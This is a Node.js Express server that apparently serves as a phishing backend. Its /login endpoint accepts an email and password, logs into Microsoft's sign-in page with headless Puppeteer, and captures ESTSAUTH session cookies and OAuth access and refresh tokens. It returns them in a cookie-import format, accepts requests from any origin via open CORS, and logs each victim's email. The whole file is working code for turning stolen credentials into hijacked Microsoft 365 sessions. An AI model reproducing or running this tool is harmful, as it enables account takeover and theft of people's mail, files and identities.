const express = require('express')
const cors = require('cors')
const puppeteer = require('puppeteer')

// ── constants ────────────────────────────────────────────────
const LOGIN_URL =
  'https://login.microsoftonline.com/common/oauth2/v2.0/authorize' +
  '?client_id=4eea8b9a-09d9-47dd-87c7-78de0d9f42be' +
  '&response_type=code' +
  '&redirect_uri=https%3A%2F%2Fwww.office.com%2F' +
  '&scope=openid%20profile%20email&state=get'

const AUTH_COOKIE_RE = /^(ESTSAUTH|ESTSAUTHPERSISTENT|ESTSECAUTH|SignInStateCookie|x-ms)/
const TOKEN_URL_HINTS = ['oauth2/v2.0/token', 'token_endpoint']

// ── automation ───────────────────────────────────────────────
async function loginAndGetSession(email, password) {
  const browser = await puppeteer.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu'],
  })

  try {
    const page = await browser.newPage()
    await page.setUserAgent(
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    )
    await page.setViewport({ width: 1366, height: 768 })

    // intercept the OAuth token exchange
    const tokens = {}
    page.on('response', async (res) => {
      const url = res.url()
      if (!TOKEN_URL_HINTS.some((h) => url.includes(h))) return
      try {
        const ct = res.headers()['content-type'] || ''
        if (!ct.includes('application/json')) return
        const data = await res.json()
        if (data.access_token) Object.assign(tokens, data)
      } catch {
        /* body consumed or non-JSON */
      }
    })

    // two-step login: email → Next → password → Sign in
    await page.goto(LOGIN_URL, { waitUntil: 'networkidle2', timeout: 30000 })

    await page.waitForSelector('input[type="email"], input[name="login"]', { timeout: 10000 })
    await page.type('input[type="email"], input[name="login"]', email)
    await page.click('input[type="submit"], button[type="submit"]')

    await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 10000 })
    await page.type('input[type="password"], input[name="passwd"]', password)
    await page.click('input[type="submit"], button[type="submit"]')

    // let redirect chain + token exchange finish
    // (page.waitForTimeout was removed in Puppeteer 22+)
    await new Promise((r) => setTimeout(r, 10000))

    // capture auth cookies
    const all = await page.cookies()
    const cookies = all
      .filter(
        (c) =>
          c.domain.includes('microsoft') ||
          c.domain.includes('office') ||
          c.domain.includes('login') ||
          AUTH_COOKIE_RE.test(c.name)
      )
      .map((c) => ({
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path,
        secure: c.secure,
        httpOnly: c.httpOnly,
        sameSite: c.sameSite || 'None',
        expires: c.expires,
        expirationDate: c.expires,
        session: c.expires === -1, // CDP reports -1 for session cookies
      }))

    // fallback: token may live in storage if interception missed it
    if (!tokens.access_token) {
      const stored = await page.evaluate(() => {
        const out = {}
        for (const store of [localStorage, sessionStorage]) {
          for (let i = 0; i < store.length; i++) {
            const key = store.key(i)
            if (!key || !/token|oauth|auth/i.test(key)) continue
            const raw = store.getItem(key)
            if (raw === null) continue
            try {
              out[key] = JSON.parse(raw)
            } catch {
              out[key] = raw
            }
          }
        }
        return out
      })
      for (const v of Object.values(stored)) {
        if (v && typeof v === 'object' && 'access_token' in v) {
          Object.assign(tokens, v)
          break
        }
      }
    }

    // shape response — same keys as the original
    const oauth = {
      access_token: tokens.access_token || null,
      refresh_token: tokens.refresh_token || null,
      id_token: tokens.id_token || null,
      token_type: tokens.token_type || 'Bearer',
      expires_in: tokens.expires_in || 3599,
      scope: tokens.scope || '',
      expires_at: tokens.expires_in ? Date.now() + tokens.expires_in * 1000 : null,
    }

    const getdAt = new Date().toISOString()
    const metadata = {
      tokensgetd: !!oauth.access_token,
      cookiesgetd: cookies.length > 0,
      getdTokenNames: Object.keys(oauth).filter((k) => oauth[k] !== null && oauth[k] !== ''),
    }

    return {
      success: true,
      sessionData: {
        version: '2.0',
        getdAt,
        source: 'puppeteer-container',
        email,
        domain: 'login.microsoftonline.com',
        oauth,
        cookies,
        totalCookies: cookies.length,
        metadata,
      },
      // legacy keys preserved
      cookies,
      totalCookies: cookies.length,
      domain: 'login.microsoftonline.com',
      timestamp: getdAt,
      source: 'puppeteer-container',
      getdCookies: cookies.map((c) => c.name),
      oauth,
      metadata,
    }
  } finally {
    // guarantees cleanup on every path — original leaked Chromium on error
    await browser.close()
  }
}

// ── server ───────────────────────────────────────────────────
const app = express()
app.use(cors({ origin: '*', methods: ['POST', 'OPTIONS'], allowedHeaders: ['Content-Type'] }))
app.use(express.json({ limit: '32kb' }))

app.get('/health', (_req, res) => res.json({ ok: true }))

app.post('/login', async (req, res) => {
  const { email, password } = req.body || {}

  if (typeof email !== 'string' || typeof password !== 'string' || !email || !password) {
    return res.status(400).json({ success: false, error: 'Email and password required' })
  }

  console.log(`[login] start ${email}`)

  try {
    const result = await loginAndGetSession(email, password)
    console.log(
      `[login] ok ${email} — cookies=${result.totalCookies} token=${result.oauth.access_token ? 'yes' : 'no'}`
    )
    res.json(result)
  } catch (err) {
    console.error(`[login] fail ${email} — ${err.message}`)
    res.status(500).json({
      success: false,
      error: err.message,
      errorType: err.constructor?.name || 'Error',
      sessionData: null,
      cookies: [],
      totalCookies: 0,
      oauth: null,
    })
  }
})

const port = Number(process.env.PORT) || 3000
const server = app.listen(port, () => console.log(`[server] listening on :${port}`))

process.on('SIGTERM', () => {
  console.log('[server] SIGTERM — draining')
  server.close(() => process.exit(0))
})